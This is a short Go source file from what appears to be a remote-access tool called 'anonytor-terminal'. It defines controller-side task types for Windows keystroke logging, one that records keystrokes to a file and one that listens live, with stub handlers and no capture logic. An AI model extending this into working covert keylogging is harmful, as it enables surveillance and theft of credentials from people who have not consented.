package windows

import (
	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
	"io"
)

// 开始记录到文件
type KeyboardRecordToFileTask struct {
	task.Base
	Command string
	Result  chan string
}

func (t *KeyboardRecordToFileTask) GetCmdType() definition.CmdType {
	return definition.KeyboardRecordToFile
}

func (t *KeyboardRecordToFileTask) OnTaskWantRetrieveThroughCtrl(buf []byte) {
	t.Result <- string(buf)
}

func (t *KeyboardRecordToFileTask) GetSerializedParam() string {
	return t.Command
}

// 实时监听
type KeyboardRecordListenTask struct {
	task.Base
}

func (t *KeyboardRecordListenTask) GetCmdType() definition.CmdType {
	return definition.KeyboardRecordListen
}

func (t *KeyboardRecordListenTask) OnTransConnEstablished(r io.ReadWriter) {

}
